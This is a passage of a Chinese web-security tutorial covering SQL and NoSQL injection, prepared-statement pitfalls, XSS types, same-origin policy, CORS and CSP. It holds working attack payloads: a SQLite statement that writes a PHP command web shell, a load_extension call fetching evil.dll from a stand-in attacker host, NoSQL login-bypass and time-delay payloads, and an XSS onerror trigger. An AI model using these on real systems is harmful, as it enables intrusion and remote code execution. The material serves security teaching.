class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>3</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ATTACH <span class="cm-keyword">DATABASE</span> <span class="cm-string">'/var/www/lol.php'</span> <span class="cm-keyword">AS</span> lol<span class="cm-punctuation">;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">CREATE</span> <span class="cm-keyword">TABLE</span> lol<span class="cm-variable-2">.pwn</span> <span class="cm-bracket">(</span>dataz <span class="cm-builtin">text</span><span class="cm-bracket">)</span><span class="cm-punctuation">;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">INSERT</span> <span class="cm-keyword">INTO</span> lol<span class="cm-variable-2">.pwn</span> <span class="cm-bracket">(</span>dataz<span class="cm-bracket">)</span> <span class="cm-keyword">VALUES</span> <span class="cm-bracket">(</span><span class="cm-string">'&lt;?system($_GET['</span>cmd<span class="cm-string">']); ?&gt;'</span><span class="cm-bracket">)</span><span class="cm-punctuation">;</span><span class="cm-operator">--</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>Load_extension</span></p><p><span>UNION SELECT 1,load_extension(</span><span>&#39;</span><span>\</span><span>\</span><span>evilhost</span><span>\</span><span>evil.dll</span><span>&#39;</span><span>,</span><span>&#39;</span><span>E</span><span>&#39;</span><span>);</span><span>-</span><span>-</span></p><h4 id='nosql-payload'><span>NoSQL Payload</span></h4><h5 id='常见payload-2'><span>常见Payload</span></h5><ul><li><h5 id='绕过限制条件'><span>绕过限制条件</span></h5><ul><li><span>{</span><span>&quot;</span><span>username</span><span>&quot;</span><span>: </span><span>&quot;</span><span>user</span><span>&quot;</span><span>} =</span><span>&gt;</span><span> {</span><span>&quot;</span><span>username</span><span>&quot;</span><span>: {</span><span>&quot;</span><span>ne</span><span>&quot;</span><span>: </span><span>&quot;</span><span>fakeuser</span><span>&quot;</span><span>}}</span></li><li><span>{</span><span>&quot;</span><span>$</span><span>where</span><span>&quot;</span><span>: </span><span>&quot;</span><span>return true</span><span>&quot;</span><span>}</span></li></ul></li><li><h5 id='测试用字符'><span>测试用字符</span></h5><ul><li><h5 id='--------'>’<span> </span><span>&quot;</span><span> </span><span>\</span><span> / </span><span>$</span><span> </span><span>[</span><span> </span><span>]</span><span> . </span><span>&gt;</span></h5></li></ul></li><li><h5 id='布尔测试常用'><span>布尔测试常用</span></h5><ul><li><span>{</span><span>&quot;</span><span>$</span><span>ne</span><span>&quot;</span><span>: -1}</span></li><li><span>{</span><span>&quot;</span><span>$</span><span>in</span><span>&quot;</span><span>: </span><span>[</span><span>]</span><span>}</span></li><li><span>{</span><span>&quot;</span><span>$</span><span>where</span><span>&quot;</span><span>: </span><span>&quot;</span><span>return true</span><span>&quot;</span><span>}</span></li><li><span>{</span><span>&quot;</span><span>$</span><span>or</span><span>&quot;</span><span>: </span><span>[</span><span>{},{</span><span>&quot;</span><span>foo</span><span>&quot;</span><span>:</span><span>&quot;</span><span>1</span><span>&quot;</span><span>}</span><span>]</span><span>}</span></li></ul></li><li><h5 id='时间'><span>时间</span></h5><ul><li><span>{</span><span>&quot;</span><span>$</span><span>where</span><span>&quot;</span><span>: </span><span>&quot;</span><span>sleep(100)</span><span>&quot;</span><span>}</span></li></ul></li></ul><h3 id='418--预编译'><span>4.1.8  预编译</span></h3><h4 id='简介-10'><span>简介</span></h4><blockquote><p><span>SQL 注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的 SQL引擎进行解析为 AST 或 Opcode，第二次交互发送数据，代入 AST 或 Opcode 中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。</span></p></blockquote><h4 id='模拟预编译'><span>模拟预编译</span></h4><blockquote><p><span>为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。</span></p></blockquote><h4 id='绕过-1'><span>绕过</span></h4><h4 id='预编译使用错误'><span>预编译使用错误</span></h4><blockquote><p><span>预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。</span></p></blockquote><h4 id='部分参数不可预编译'><span>部分参数不可预编译</span></h4><blockquote><p><span>在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。</span></p></blockquote><h4 id='预编译实现错误'><span>预编译实现错误</span></h4><blockquote><p><span>部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。</span></p></blockquote><h3 id='419--参考文章'><span>4.1.9  参考文章</span></h3><h4 id='tricks-1'><span>Tricks</span></h4><ul><li><a href='http://blog.wils0n.cn/archives/178/'><span>sqlmap time based inject 分析</span></a></li><li><a href='https://github.com/NetSPI/SQLInjectionWiki'><span>SQLInjectionWiki</span></a></li><li><a href='https://mp.weixin.qq.com/s/BucCNyCmyATdRENZp0AF2A'><span>常见数据库写入 Webshell 汇总</span></a></li><li><a href='https://mp.weixin.qq.com/s/uENvpPan7aVd7MbSoAT9Dg'><span>MSSQL 数据库攻击实战指北</span></a></li></ul><h4 id='bypass-1'><span>Bypass</span></h4><ul><li><a href='https://mp.weixin.qq.com/s/fSBZPkO0-HNYfLgmYWJKCg'><span>SQL 注入 ByPass 的一些小技巧</span></a></li><li><a href='https://xz.aliyun.com/t/368'><span>Waf Bypass 之道</span></a></li><li><a href='https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI'><span>MySQL Bypass Wiki</span></a></li></ul><h4 id='nosql'><span>NoSQL</span></h4><ul><li><a href='http://www.yunweipai.com/archives/14084.html'><span>NoSQL 注入的分析和缓解</span></a></li><li><a href='https://mp.weixin.qq.com/s/tG874LNTIdiN7MPtO-hovA'><span>NoSQL 注入</span></a></li></ul><p>&nbsp;</p><h2 id='42--xss'><span>4.2  XSS</span></h2><h3 id='421--分类'><span>4.2.1  分类</span></h3><h4 id='简介-11'><span>简介</span></h4><blockquote><p><span>XSS 全称为 Cross Site Scripting，为了和 CSS 分开简写为 XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的 JavaScript 代码执行。XSS 通常被用于获取 Cookie、以受攻击者的身份进行操作等行为。</span></p></blockquote><h4 id='反射型-xss'><span>反射型 XSS</span></h4><blockquote><p><span>反射型 XSS 是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句：</span><span>&lt;</span><span>?php echo </span><span>&quot;</span><span>&lt;</span><span>p</span><span>&gt;</span><span>hello, </span><span>$</span><span>_</span><span>GET</span><span>[</span><span>&#39;</span><span>user</span><span>&#39;</span><span>]</span><span>&lt;</span><span>/p</span><span>&gt;</span><span>&quot;</span><span>;?</span><span>&gt;</span><span> ，那么在访问时设置 /?user=</span><span>&lt;</span><span>/p</span><span>&gt;</span><span>&lt;</span><span>script</span><span>&gt;</span><span>alert(</span><span>&quot;</span><span>hack</span><span>&quot;</span><span>)</span><span>&lt;</span><span>/ script</span><span>&gt;</span><span>&lt;</span><span>p</span><span>&gt;</span><span> ，则可执行预设好的 JavaScript 代码。</span></p><p><span>反射型 XSS 通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发， 受到 XSS Auditor、No-</span></p><p><span>Script 等防御手段的影响较大。</span></p></blockquote><h4 id='储存型-xss'><span>储存型 XSS</span></h4><blockquote><p><span>储存型 XSS 相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。</span></p></blockquote><h4 id='dom-xss'><span>DOM XSS</span></h4><blockquote><p><span>DOM 型 XSS 不同之处在于 DOM 型 XSS 一般和服务器的解析响应没有直接关系，而是在 JavaScript 脚本动态执行的过程中产生的。</span></p><p><span>例如</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>17</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">html</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">head</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">title</span><span class="cm-tag cm-bracket">&gt;</span>DOM Based XSS Demo<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">title</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">script</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">function</span> <span class="cm-def">xsstest</span>()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">str</span> <span class="cm-operator">=</span> <span class="cm-variable">document</span>.<span class="cm-property">getElementById</span>(<span class="cm-string">"input"</span>).<span class="cm-property">value</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">document</span>.<span class="cm-property">getElementById</span>(<span class="cm-string">"output"</span>).<span class="cm-property">innerHTML</span> <span class="cm-operator">=</span> <span class="cm-string">"&lt;img src='"</span><span class="cm-operator">+</span><span class="cm-variable-2">str</span><span class="cm-operator">+</span><span class="cm-string">"'&gt;&lt;/img&gt;"</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">script</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">head</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">body</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">div</span> <span class="cm-attribute">id</span>=<span class="cm-string">"output"</span><span class="cm-tag cm-bracket">&gt;&lt;/</span><span class="cm-tag">div</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">input</span> <span class="cm-attribute">type</span>=<span class="cm-string">"text"</span> <span class="cm-attribute">id</span>=<span class="cm-string">"input"</span> <span class="cm-attribute">size</span>=<span class="cm-string">50</span> <span class="cm-attribute">value</span>=<span class="cm-string">""</span> <span class="cm-tag cm-bracket">/&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">input</span> <span class="cm-attribute">type</span>=<span class="cm-string">"button"</span> <span class="cm-attribute">value</span>=<span class="cm-string">"submit"</span> <span class="cm-attribute">onclick</span>=<span class="cm-string">"xsstest()"</span> <span class="cm-tag cm-bracket">/&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">body</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">html</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 385px;"></div><div class="CodeMirror-gutters" style="height: 385px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre></blockquote><blockquote><h6 id='输入-x-onerrorjavascriptalertxss-即可触发'><span>输入 x</span><span>&#39;</span><span> onerror=</span><span>&#39;</span><span>javascript:alert(/xss/) 即可触发。</span></h6></blockquote><h4 id='blind-xss'><span>Blind XSS</span></h4><blockquote><p><span>Blind XSS 是储存型 XSS 的一种，它保存在某些存储中，当一个</span>“<span>受害者</span>”<span>访问这个页面时执行，并 在文档对象模型 (DOM) 中呈现 payload。它被称为 Blind 的原因是因为它通常发生在通常不暴露给用户的功能上。2</span></p></blockquote><h3 id='422--危害'><span>4.2.2  危害</span></h3><blockquote><p><span>存在 XSS 漏洞时，可能会导致以下几种情况：</span></p></blockquote><ol start='' ><li><span>用户的 Cookie 被获取，其中可能存在 Session ID 等敏感信息。若服务器端没有做相应防护，攻击者可用对应 Cookie 登陆服务器。</span></li><li><span>攻击者能够在一定限度内记录用户的键盘输入。</span></li><li><span>攻击者通过 CSRF 等方式以用户身份执行危险操作。</span></li><li><span>XSS 蠕虫。</span></li><li><span>获取用户浏览器信息。</span></li><li><span>利用 XSS 漏洞扫描用户内网。</span></li></ol><h3 id='423--同源策略'><span>4.2.3  同源策略</span></h3><h4 id='简介-12'><span>简介</span></h4><blockquote><p><span>同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。是否同源由 URL</span></p><p><span>决定，URL 由协议、域名、端口和路径组成，如果两个 URL 的协议、域名和端口相同，则表示他们同源。</span></p></blockquote><h4 id='file域的同源策略'><span>file域的同源策略</span></h4><blockquote><p><span>在之前的浏览器中，任意两个 file 域的 URI 被认为是同源的。本地磁盘上的任何 HTML 文件都可以读取本地磁盘上的任何其他文件。</span></p><p><span>从 Gecko 1.9 开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。</span></p></blockquote><h4 id='cookie的同源策略'><span>cookie的同源策略</span></h4><blockquote><p><span>cookie 使用不同的源定义方式，一个页面可以为本域和任何父域设置 cookie，只要是父域不是公共后缀 (public suffix) 即可。</span></p><p><span>不管使用哪个协议 (HTTP/HTTPS) 或端口号，浏览器都允许给定的域以及其任何子域名访问 cookie。设置 cookie 时，可以使用 domain / path / secure 和 http-only 标记来限定其访问性。</span></p><p><span>所以 </span><a href='https://localhost:8080/' target='_blank' class='url'>https://localhost:8080/</a><span> 和 </span><a href='http://localhost:8081/' target='_blank' class='url'>http://localhost:8081/</a><span> 的 Cookie 是共享的。</span></p></blockquote><h4 id='flashsilverlight跨域'><span>Flash/SilverLight跨域</span></h4><blockquote><p><span>浏览器的各种插件也存在跨域需求。通常是通过在服务器配置 crossdomain.xml，设置本服务允许哪些域名的跨域访问。</span></p><p><span>客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。</span></p></blockquote><h4 id='源的更改'><span>源的更改</span></h4><blockquote><p><span>同源策略认为域和子域属于不同的域，例如 child1.a.com 与 a.com / child1.a.com 与 child2.a.com /</span></p><p><span>xxx.child1.a.com 与 child1.a.com 两两不同源。</span></p><p><span>对于这种情况，可以在两个方面各自设置 document.domain=</span><span>&#39;</span><span>a.com</span><span>&#39;</span><span> 来改变其源来实现以上任意两个页面之间的通信。</span></p><p><span>另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为 null 。</span></p></blockquote><h4 id='跨源访问'><span>跨源访问</span></h4><h5 id='同源策略控制了不同源之间的交互这些交互通常分为三类'><span>同源策略控制了不同源之间的交互，这些交互通常分为三类：</span></h5><ol start='' ><li><h5 id='通常允许跨域写操作-cross-origin-writes'><span>通常允许跨域写操作 (Cross-origin writes)</span></h5><ul><li><span>链接 (links)</span></li><li><span>重定向</span></li><li><span>表单提交</span></li></ul></li><li><p><span>通常允许跨域资源嵌入 (Cross-origin embedding)</span></p></li><li><p><span>通常不允许跨域读操作 (Cross-origin reads)</span></p></li></ol><h5 id='可能嵌入跨源的资源的一些示例有'><span>可能嵌入跨源的资源的一些示例有：</span></h5><ul><li><span>&lt;</span><span>script src=</span><span>&quot;</span><span>.</span><span>..</span><span>&quot;</span><span>&gt;</span><span>&lt;</span><span>/script</span><span>&gt;</span><span> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。</span></li><li><span>&lt;</span><span>link rel=</span><span>&quot;</span><span>stylesheet</span><span>&quot;</span><span> href=</span><span>&quot;</span><span>.</span><span>..</span><span>&quot;</span><span>&gt;</span><span> 标签嵌入 CSS。由于 CSS 的松散的语法规则，CSS 的跨域需要一个设置正确的 Content-Type 消息头。</span></li><li><span>&lt;</span><span>img</span><span>&gt;</span><span> / </span><span>&lt;</span><span>video</span><span>&gt;</span><span> / </span><span>&lt;</span><span>audio</span><span>&gt;</span><span> 嵌入多媒体资源。</span></li><li><span>&lt;</span><span>object</span><span>&gt;</span><span> </span><span>&lt;</span><span>embed</span><span>&gt;</span><span> 和 </span><span>&lt;</span><span>applet</span><span>&gt;</span><span> 的插件。</span></li><li><span>\@font-face 引入的字体。一些浏览器允许跨域字体 ( cross-origin fonts)，一些需要同源字体 (same- origin fonts)。</span></li><li><span>&lt;</span><span>frame</span><span>&gt;</span><span> 和 </span><span>&lt;</span><span>iframe</span><span>&gt;</span><span> 载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。</span></li></ul><h4 id='jsonp-跨域'><span>JSONP 跨域</span></h4><blockquote><p><span>JSONP 就是利用 </span><span>&lt;</span><span>script</span><span>&gt;</span><span> 标签的跨域能力实现跨域数据的访问，请求动态生成的 JavaScript 脚本同时带一个 callback 函数名作为参数。</span></p><p><span>服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用 callback 函数。</span></p><p><span>JSONP 也存在一些安全问题，例如当对传入/传回参数没有做校验就直接执行返回的时候，会造成 XSS 问题。没有做 Referer 或 Token 校验就给出数据的时候，可能会造成数据泄露。</span></p><p><span>另外 JSONP 在没有设置 callback 函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为 SOME 攻击。</span></p></blockquote><h4 id='跨源脚本-api-访问'><span>跨源脚本 API 访问</span></h4><blockquote><p><span>Javascript 的 APIs 中，如 iframe.contentWindow , window.parent, window.open 和 window.opener 允许文档间相互引用。当两个文档的源不同时，这些引用方式将对 window 和 location 对象的访问添加限制。</span></p><p><span>window 允许跨源访问的方法有：</span></p></blockquote><ul><li><span>window.blur</span></li><li><span>window.close</span></li><li><span>window.focus</span></li><li><span>window.postMessage</span></li></ul><blockquote><p><span>window 允许跨源访问的属性有</span></p></blockquote><ul><li><span>window.closed</span></li><li><span>window.frames</span></li><li><span>window.length</span></li><li><span>window.location</span></li><li><span>window.opener</span></li><li><span>window.parent</span></li><li><span>window.self</span></li><li><span>window.top</span></li><li><span>window.window</span></li></ul><blockquote><p><code>其中 window.location 允许读/写，其他的属性只允许读。</code></p></blockquote><h4 id='跨源数据存储访问'><span>跨源数据存储访问</span></h4><blockquote><p><span>存储在浏览器中的数据，如 localStorage 和 IndexedDB，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的 Javascript 脚本不能对属于其它源的数据进行读写操作。</span></p></blockquote><h4 id='cors'><span>CORS</span></h4><blockquote><p><span>CORS 是一个 W3C 标准，全称是跨域资源共享 (Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。</span></p></blockquote><h4 id='常见请求头'><span>常见请求头</span></h4><ul><li><p><strong><span>Origin</span></strong></p><ul><li><span>预检请求或实际请求的源站 URI, 浏览器请求默认会发送该字段</span></li><li><span>Origin: </span><span>&lt;</span><span>origin</span><span>&gt;</span></li></ul></li><li><h4 id='access-control-request-method'><span>Access-Control-Request-Method</span></h4><ul><li><span>声明请求使用的方法</span></li><li><span>Access-Control-Request-Method: </span><span>&lt;</span><span>method</span><span>&gt;</span></li></ul></li><li><h4 id='access-control-request-headers'><span>Access-Control-Request-Headers</span></h4><ul><li><span>声明请求使用的 header 字段</span></li><li><span>Access-Control-Request-Headers: </span><span>&lt;</span><span>field-name</span><span>&gt;</span><span>[</span><span>, </span><span>&lt;</span><span>field-name</span><span>&gt;</span><span>]</span><span>*</span></li></ul></li></ul><h4 id='常见返回头'><span>常见返回头</span></h4><ul><li><p><strong><span>Access-Control-Allow-Origin</span></strong></p><ul><li><span>声明允许访问的源外域URI</span></li><li><span>对于携带身份凭证的请求不可使用通配符 </span><span>*</span></li><li><span>Access-Control-Allow-Origin: </span><span>&lt;</span><span>origin</span><span>&gt;</span><span> </span><span>|</span><span> </span><span>*</span></li></ul></li><li><h4 id='access-control-expose-headers'><span>Access-Control-Expose-Headers</span></h4><ul><li><span>声明允许暴露的头</span></li><li><span>e.g. Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header</span></li></ul></li><li><h4 id='access-control-max-age'><span>Access-Control-Max-Age</span></h4><ul><li><span>声明 Cache 时间</span></li><li><span>Access-Control-Max-Age: </span><span>&lt;</span><span>delta-seconds</span><span>&gt;</span></li></ul></li><li><h4 id='access-control-allow-credentials'><span>Access-Control-Allow-Credentials</span></h4><ul><li><span>声明是否允许在请求中带入</span></li><li><span>Access-Control-Allow-Credentials: true</span></li></ul></li><li><h4 id='access-control-allow-methods'><span>Access-Control-Allow-Methods</span></h4><ul><li><span>声明允许的访问方式</span></li><li><span>Access-Control-Allow-Methods: </span><span>&lt;</span><span>method</span><span>&gt;</span><span>[</span><span>, </span><span>&lt;</span><span>method</span><span>&gt;</span><span>]</span><span>*</span></li></ul></li><li><h4 id='access-control-allow-headers'><span>Access-Control-Allow-Headers</span></h4><ul><li><span>声明允许的头</span></li><li><span>Access-Control-Allow-Headers: </span><span>&lt;</span><span>field-name</span><span>&gt;</span><span>[</span><span>, </span><span>&lt;</span><span>field-name</span><span>&gt;</span><span>]</span><span>*</span></li></ul></li></ul><h4 id='防御建议'><span>防御建议</span></h4><ul><li><span>如非必要不开启 CORS</span></li><li><span>定义详细的白名单，不使用通配符，仅配置所需要的头</span></li><li><span>配置 Vary: Origin 头部</span></li><li><span>如非必要不使用 Access-Control-Allow-Credentials</span></li><li><span>限制缓存的时间</span></li></ul><h4 id='阻止跨源访问'><span>阻止跨源访问</span></h4><blockquote><p><span>阻止跨域写操作，可以检测请求中的 CSRF token ，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。</span></p><p><span>阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守 Content-Type 消息头。例如如果在 HTML 文档中指定 </span><span>&lt;</span><span>script</span><span>&gt;</span><span> 标记，则浏览器会尝试将 HTML 解析为 JavaScript。</span></p></blockquote><h3 id='424--csp'><span>4.2.4  CSP</span></h3><h4 id='csp是什么'><span>CSP是什么？</span></h4><blockquote><p><span>Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。</span></p></blockquote><h4 id='配置'><span>配置</span></h4><blockquote><p><span>CSP 策略可以通过 HTTP 头信息或者 meta 元素定义。</span></p><p><span>CSP 有三类：</span></p></blockquote><ul><li><span>Content-Security-Policy (Google 